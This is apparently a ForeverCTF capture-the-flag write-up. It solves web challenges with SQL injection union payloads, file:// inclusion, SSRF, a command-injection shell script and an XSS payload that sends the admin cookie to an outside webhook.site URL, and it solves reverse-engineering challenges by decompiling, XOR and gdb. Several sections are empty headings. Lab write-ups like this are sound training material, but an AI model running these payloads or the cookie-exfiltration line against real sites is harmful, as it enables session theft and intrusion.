<h3> ForeverCTF  </h3>

<h3> Challenge Solved: </h3>

__P.S I'll be updating since I haven't really solved all the challs and the ctf is running forever `¯\_(ツ)_/¯`__ 

## Web
- Start at the Source 
- Cookies
- Baby SQLi 
- Local File Inclusion 
- XSS
- Server Side Request Forgery
- Command Injection
- SQLi

## Binary Exploitation
- uint64_t
- Tricky Indices
- Overflow
- Jump
- Shelly Sells Shells
- Params
- Canary in a Coal Mine
- ROP
- Get my GOT
- Leak
- ret2libc
- Printf
- Resolve
- Signals

## Reverse Engineering
- strings
- xor
- Simple Checker
- gdb
- Annoying XOR 

## Cryptography
- All Your Base Are Belong To Us
- Zeros and Ones
- All Greek To Me
- DEADBEEF
- Bookwork
- RSA
- Bad Parameters

## Forensics
- Met A Data
- Not Very Significant Message
- Redacted
- Magic
- Zipped
- Dr. Doom's Devious Deletion Dilemma

 ## Miscellaneous
 - Nested Zip

 ## Networking
 - HTTP Objects


### Web 8/8:~
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c8f9770c-1c58-4c75-a082-202043e60112)

#### Start at the Source 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f400d2ca-8e7c-4a86-a5ec-69bc518ac1a3)

Going over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7b6d1659-e78e-4543-b57b-0e6281ea98e4)

Checking the page source gives the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/64baed16-debe-4ab9-92f0-86c0c02aa6a1)

```
Flag: utflag{1_l1ke_h1de_&_seek}
```

#### Cookies
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fd8cf95b-efa0-4030-a47a-6291128d8802)

Going over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ee338b71-afba-479a-930f-391337b4e2d6)

Checking the cookies available shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/065ebe70-f27a-470d-afd8-11058b418ff4)

I set the `isCookieMonster` to `true` 

And on refreshing the page I got the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/014558e8-f397-4b56-9b1b-e0efde833614)

```
Flag: utflag{c0ngrat5_tak3_a_byt3}
```

#### Baby SQLi 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/df6e5bd9-c271-4b02-94f9-072422f05541)

We are given this:

```sql
INSERT INTO users(username, password, email) VALUES ('admin', 'utflag{*****************}', 'contact@isss.io');
```

So this means the value stored in column `password` will contain the flag

Moving over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1e403fcc-299a-4c23-9812-d88128aa21ef)

Searching for a valid mail returns the username it belongs to 
![image](https://github-production-user-asset-6210df.s3.amazonaws.com/127159644/252477232-b98b35f8-b8c5-4956-a915-3eadf423d87c.png)

But a non valid mail turns an empty array
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f162a2c0-5c01-4cb6-99fe-3004a81b62b7)

When I inject a single quote `'` it returns error
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ccdc987c-86eb-49fb-a0d8-6b8fa9de11e7)

But using `--` comments it and no error is shown
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/79fd4c7f-423f-44f1-9927-04bca149728d)

This means that the web server is vulneable to SQL Injection

We can also tell from the Challenge name 😉

Since only a single table is available and the flag is in the password column. I will use a `union` query to get that
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6221124d-4394-42c3-a4b5-912586b3b50e)

```r
Payload: ' union select password from users --
```

And I got the flag

```
Flag: utflag{wow_lets_unionize}
```

#### Local File Inclusion 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/09035a6c-4351-4f83-a4ca-beb5de45670f)

Going over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ab466005-b7ed-4df6-855a-863d00fbe86f)

I tried including `google.com` and it returns the content
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1715f839-b09f-460a-8607-b7df10a905f8)

One thing we should know is that not only `http and https` are the url protocols there's also `gopher, ftp, file etc.` 

The `file` protocol can be used in this case

We are already given the flag location to be at `/` 

Let us get it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6adf3015-86bf-4d67-ac1f-2743c0c41949)

```
Payload: file:///flag.txt
```

And I get the flag

```
Flag: utflag{g0t_y0ur_r3s0urc3!}
```

#### XSS
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c9b4ce77-3d13-48f3-b704-97f148f5b916)

Going over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/797af4c8-143f-4a67-996a-f9ce532f9ecf)

Giving it input shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ff0cefde-8297-4cb8-8bbd-3e54085ee5d0)

When I clicked on the url it gave I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4118d0ea-e60d-4345-980e-24c435ceedc1)

And it is just in the form tag 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0e62e1c6-7926-4dd1-b3b1-93d4fd910f42)

I can try inject html tags 

Doing that works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/417941d0-9723-4c7e-a4ec-f661debf4687)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/241c8bea-a00f-44f7-b488-4f72c064c5ec)

From the challenge description the flag is in the admin cookie

So from this vulnerability which is of cause Cross Site Scripting (XSS) we can steal the admin cookie

But when I tried injecting a `alert` tag I got error
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3cb7f975-4b51-4c52-9fc6-044602e3abef)

Luckily I don't even need that to steal the admin cookie

Here's the payload I used
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fc4c9b11-f085-42d1-b04d-82c4c5f85df8)

```
<img src=x onerror=this.src='https://webhook.site/04fe7606-2bda-443a-a66e-37be76febc63/?'+document.cookie;>
```

Back on the [webhook](https://webhook.site) site I got multiple http requess and each one contains the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c31dc362-1380-44cf-bef0-899634b2e0c3)

```
Flag: utflag{boop_beep_ddj333}
```

#### Server Side Request Forgery
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/58e97247-e19e-4289-8a1e-ef278ac6594d)

Accessing the url shows this error
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/76e62907-9313-4072-9fa9-4c9ec0e7ee2d)

```
Sorry, only cool kids on the internal network are allowed to login.
```

I then accessed `http://forever.isss.io:4225/` and got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d2293dfb-fcd0-4024-a6ab-337695cbb159)

We can try using `file` protocol to read local files
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1c4e3b0f-32e0-4a6e-a21d-2efe602ce1f4)

But we need the flag

The challenge name has already given us the hint of solving this which is a Server Side Request Forgery (SSRF) vulnerability

With this vulnerability we can access internal services running on the host

What we would want to access is `{url}/flag` 

Doing that I got the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0d6c771a-87f2-46ac-88e1-45e21cc632fb)

```
Flag: utflag{SSRF_isnt_so_bad_after_all}
```

#### Command Injection 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a1c84911-23d5-4c50-b8fe-608e8a0f0a3a)

The source code is given

After downloading it reading the content gives this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ca9346df-ba7f-470d-a026-2f2eb8142d3b)

```python
from flask import *
import subprocess
app = Flask(__name__)

@app.route('/', methods=['POST','GET'])
def index():
    if request.method == 'POST':
        url = request.form.get('url')
        if not url is None:
            command = 'ping -c 1 '+url
            p = subprocess.run(command, shell=True, capture_output=True)
            content = p.stdout.decode('ascii')
            return render_template('index.html', content=content)
    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

We can see that if the request made is a `GET` request it returns the content of `index.html` else if the http request method is `POST` it gets the content of the url from the request form and does a ping command on the url sent 

Since the command is passed through subprocess and shell is set to True we can get command injection 🙂

Here's my script for it

```python
#!/usr/bin/python3
import requests
import re

while True:
    try:
        command = input('$ ')
        if command.lower() != 'q':
            url = 'http://forever.isss.io:4223'
            req = requests.post(url, data={"url":f";{command}"})
            
            # Extract value within <code> tags using regular expression >3
            pattern = r"<code>(.*?)</code>"
            match = re.search(pattern, req.text, re.DOTALL)
            
            if match:
                code_value = match.group(1)
                print(code_value)
            else:
                print("No value found within <code> tags.")
        
        else:
            exit()
    except Exception as e:
        print(e)
```

Running it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/483c9ed9-dc59-4f3f-aeb0-f9918819d3d0)

```
Flag: utflag{c0mmand_1nj3ct3d!}
```

#### SQLi
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5277b34a-fd94-4c4f-9fd1-ac2d6dba3cd0)

We are given this

```sql
 INSERT INTO ***********(***********, ***********, ***********) VALUES ('admin', 'utflag{*****************}', 'contact@isss.io');
```

Since this is a sequel to Baby SQLi 

I'll go straight to exploitation

In this case we don't know the table nor the column where the flag is stored

But we can of cause get it 😉

First let us dump all the tables
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f9769f93-9c57-4c4b-81f3-f7efc7a47c7e)

```r
Payload: ' union select table_name from information_schema.tables --
```

Looking at the result I found this table name fishy
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/184e5ffb-8a07-4f51-91d5-fced1757f3c3)

```
secret_users_table_sfd33
```

Seems like it's the right table 🤔

Let us check the coulumns there
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ff620291-2e0f-488d-8804-f09c6435491d)

```
Payload: ' union select column_name from information_schema.columns where table_name = 'secret_users_table_sfd33' --
```

At this point we would want to dump the `passfrase` column from the `secret_users_table_sfd33` table
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/73c7b399-4f4b-4580-bf72-c9a48feb8c4d)

```
Payload: ' union select passfrase from secret_users_table_sfd33 --
```

### Binary Exploitation 14/14:~
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/efdaedac-30c9-441d-98a9-0f760ebd995c)

#### uint64_t


### Reverse Engineering 4/7:~
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6a4540bf-eac9-470a-a6c6-8755119c8b1e)

#### strings
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/82e9e178-cddf-4438-af78-88357bde6ee6)

After I downloaded the binary I ran `strings` on it and got the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/54b8acab-e9cf-492b-933e-137a3a05482b)

```
Flag: utflag{plaintext_str1ngs_aRe_b3St_Str1ngs}
```

#### xor
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/54b72838-8565-409a-88c6-4374101d8d72)

After downloading the binary I checked the file type
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4c5b65de-e58f-46c8-aedf-f72fa7ec5fa8)

We are working with a x64 binary which is not stripped and has Position Independent Executable (PIE) enabled

I decompiled it in ghidra and here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/552b87f1-78c1-4a36-8cb6-63f86f4d194a)

```c
int main(void)

{
  long in_FS_OFFSET;
  int i;
  uint local_7c;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  byte password [48];
  undefined local_18;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  local_78 = 0x43a26202d273534;
  local_70 = 0x7172727000057377;
  local_68 = 0x707037407710774;
  local_60 = 0x3007800720070;
  local_58 = 0x271737475717774;
  local_50 = 0x3c02027104000471;
  puts("enter the password:");
  __isoc99_scanf("%48s",password);
  for (i = 0; i < 48; i = i + 1) {
    password[i] = password[i] ^ 0x41;
  }
  local_18 = 0;
  local_7c = 0;
  do {
    if (47 < local_7c) {
      printf("correct");
LAB_001012c6:
      if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return 0;
    }
    if (password[(int)local_7c] != *(byte *)((long)&local_78 + (long)(int)local_7c)) {
      printf("incorrect");
      goto LAB_001012c6;
    }
    local_7c = local_7c + 1;
  } while( true );
}
```

From the decompiled code we can tell what it does:
- Receives 48 bytes of our input this means our flag length should be 48
- It iterates over all the characters of our input and xors it with 0x41
- It then checks if each index of our input is equal to each index of the flag which is stored in variable local_78
- If it returns true we get correct else incorrect

So basically what we should do is to xor each character of the hex values of the flag with 0x41 and we would get the plaintext

I tried doing that but had issue with xoring it so instead I xored the whole bytes of the binary and got the flag lol

```python
binary = bytearray(open('reversing-xor', 'rb').read())
dump = []

for i in binary:
    dump.append(chr(i ^ 0x41).encode())

with open('dump', 'wb') as fd:
    for i in dump:
        fd.write(i)

```

Running it creates the dump file then on doing `strings` I got the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/858c3071-0b54-4fcf-bf32-945275938925)

```
Flag: utflag{E62DA13305F0F5BFF1A3A9ABA5604520C0EAE0CC}
```

#### Simple Checker 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/96220496-f8a9-45c3-a900-f88c1b9cc702)

After downloading the binary I checked the file type
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/48db20c0-1992-4858-b961-8837af8b3d5a)

It is a 64 bits binary and not stripped but has PIE enabled

Using ghidra I decompiled it and here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8472544f-9fc0-4c74-a98e-7b2cb948ec8f)

```c
void main(int argc,char **argv)

{
  int iVar1;
  
  if (argc != 2) {
    __fprintf_chk(stderr,1,"Usage: %s <flag>\n",*argv);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  check(argv[1][10] == 'p');
  check(argv[1][12] == 'e');
  check(argv[1][8] == 'i');
  check(argv[1][9] == 'm');
  check(argv[1][14] == '\0');
  iVar1 = memcmp("utflag{",argv[1],7);
  check(iVar1 == 0);
  check(argv[1][7] == 's');
  check(argv[1][0xd] == '}');
  check(argv[1][0xb] == 'l');
  puts("Right!");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

Nothing much here just that we need to set each of argument 1 values and it's index to the correct one

Doing that will give this `utflag{simple}` 

We can confirm it by passing it as an argument
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/172dd7c6-14d1-4741-8757-357c061980cf)

```
Flag: utflag{simple}
```

#### gdb
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a2bd2c6b-8e62-4640-ade7-abeecddf71b2)

I did the normal checks and it's the same thing
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e97284b7-139f-4629-842e-b9e357b61299)

Decompiling in ghidra gives this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5b08e904-8c1c-4465-95a2-902aab2c2188)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b75330e3-6937-4608-b970-a3c08ccbe140)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8f5ac205-e7cf-4721-a44f-0a7ef37b67bc)

```c
undefined8 main(void)

{
  int cmp;
  size_t length;
  long in_FS_OFFSET;
  int i;
  byte local_188 [4];
  undefined local_184;
  undefined local_183;
  undefined local_182;
  undefined local_181;
  undefined local_180;
  undefined local_17f;
  undefined local_17e;
  undefined local_17d;
  undefined local_17c;
  undefined local_17b;
  undefined local_17a;
  undefined local_179;
  undefined local_178;
  undefined local_177;
  undefined local_176;
  undefined local_175;
  undefined local_174;
  undefined local_173;
  undefined local_172;
  undefined local_171;
  undefined local_170;
  undefined local_16f;
  undefined local_16e;
  undefined local_16d;
  undefined local_16c;
  undefined local_16b;
  undefined local_16a;
  undefined local_169;
  undefined local_168;
  undefined local_167;
  undefined local_166;
  undefined local_165;
  byte flag [36];
  undefined uStack_134;
  char input [264];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  local_188[0] = 0x1d;
  local_188[1] = 0x11;
  local_188[2] = 0xe;
  local_188[3] = 0x40;
  local_184 = 0x41;
  local_183 = 0x14;
  local_182 = 0xf;
  local_181 = 0x19;
  local_180 = 0x5a;
  local_17f = 0x5d;
  local_17e = 0x17;
  local_17d = 0x2c;
  local_17c = 0x59;
  local_17b = 0x18;
  local_17a = 0x3a;
  local_179 = 0x1c;
  local_178 = 0x78;
  local_177 = 0x19;
  local_176 = 0x45;
  local_175 = 0x1a;
  local_174 = 0;
  local_173 = 0;
  local_172 = 0x12;
  local_171 = 0x7f;
  local_170 = 0x1c;
  local_16f = 0x55;
  local_16e = 0x2d;
  local_16d = 0x1c;
  local_16c = 7;
  local_16b = 0x10;
  local_16a = 0x1a;
  local_169 = 0x5f;
  local_168 = 0x45;
  local_167 = 0x1f;
  local_166 = 0x32;
  local_165 = 0xf;
  puts("enter the flag:");
  fgets(input,256,stdin);
  length = strlen(input);
  if (length == 37) {
    for (i = 0; i < 0x24; i = i + 1) {
      length = strlen("heh, strings won\'t work here");
      flag[i] = "heh, strings won\'t work here"[(ulong)(long)i % length] ^ local_188[i];
    }
    uStack_134 = 0;
    length = strlen((char *)flag);
    cmp = strncmp(input,(char *)flag,length);
    if (cmp == 0) {
      puts("correct!");
    }
    else {
      puts("try again!");
    }
  }
  else {
    puts("try again!");
  }
  if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

Looking at what it does just shows a xor encryption which isn't too complex and can be easily reversible but the catch there is the usage of `strcmp` 

Since it is going to compare our input with the flag and the flag  will be in plaintext we can get the flag that way

To get the flag I'll use gdb

First let us open it up and disassemble the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/63861d4f-2239-4bb7-a433-fc697493a2bd)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/005103dc-4927-4010-80b8-c6fc43f874eb)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1f43df94-ae7d-491f-9563-2358ebbfd2a9)

I will set a breakpoint at the second `strlen` call but I need to first break at main and run 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1477ebc8-a814-4f5d-8f13-c7902c8baa81)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/653671bc-6013-4b7d-8758-aa2b205a3db8)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2fb3353d-db8b-4cd2-9f07-782286210f6b)

```
break main
break *0x555555400680
```

Now I will `continue` 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6bea2ad5-e891-4959-9390-c0fb6c452546)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d622f877-a48e-4c0f-9d01-5d51e7dbdc61)

Note that the input length must be `36`

```
Flag: utflag{k33p_yoUr_memory_t0_yourselF}
```

#### Annoying XOR 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bc0c9c07-1544-4eb5-852d-b4968695c05e)


### Cryptography 7/13:~
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0bd79645-1d31-4c93-a58f-a7b5c3f02286)


### Forensics 6/6:~
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7c9fbcf3-4546-42cc-9952-11598399e914)


### Miscellaneous 1/4:~
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2b518c94-0782-434a-9c8b-e317dde6dcd4)


### Networking 1/1:~
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9a64af52-5864-402e-9ddf-e85ee9d07066)

### Tools 7/7:~
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0b90704c-b1d3-440c-87ff-d978dfae063b)


P.S I'll be updating it >3
